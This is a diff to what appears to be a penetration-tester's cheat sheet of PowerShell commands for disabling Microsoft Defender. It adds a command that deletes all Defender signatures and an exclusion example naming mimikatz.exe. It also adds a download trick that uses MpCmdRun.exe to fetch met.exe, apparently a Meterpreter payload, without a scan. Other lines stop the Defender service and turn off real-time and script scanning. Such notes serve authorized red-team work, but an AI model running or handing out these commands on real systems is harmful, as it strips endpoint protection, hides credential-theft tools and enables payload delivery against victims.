@@ -60,6 +60,11 @@ Get-MpPreference | Select-Object  -Property ExclusionExtension
 (Get-Service windefend).stop
 ```
 
+## Defender - Remove signatures (if Internet connection is present, they will be downloaded again)
+```powershell
+.\MpCmdRun.exe -RemoveDefinitions -All
+```
+
 ## Defender - disable All
 ```powershell
 Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIOAVProtection $true;  Set-MpPreference -DisableScriptScanning $true
@@ -88,11 +93,16 @@ Set-MpPreference -DisableScriptScanning $true
 
 ## Defender - Add path to exclusions
 ```powershell
-$p = "<path|c:\temp>" ; Add-MpPreference -ExclusionPath $p -AttackSurfaceReductionOnlyExclusions $p
+$p = "<path|c:\temp\mimikatz.exe>" ; Add-MpPreference -ExclusionPath $p -AttackSurfaceReductionOnlyExclusions $p
 ```
 
 
 ## Defender - Add extension to exclusions
 ```powershell
 Set-MpPreference -ExclusionExtension "<extension|ps1>"
+```
+
+## Defender - Download without triggering scan
+```powershell
+C:\Program Files\Windows Defender\MpCmdRun.exe -DownloadFile -Url http://127.0.0.1/met.exe -Path C:\Users\snovvcrash\music\met.exe
 ```
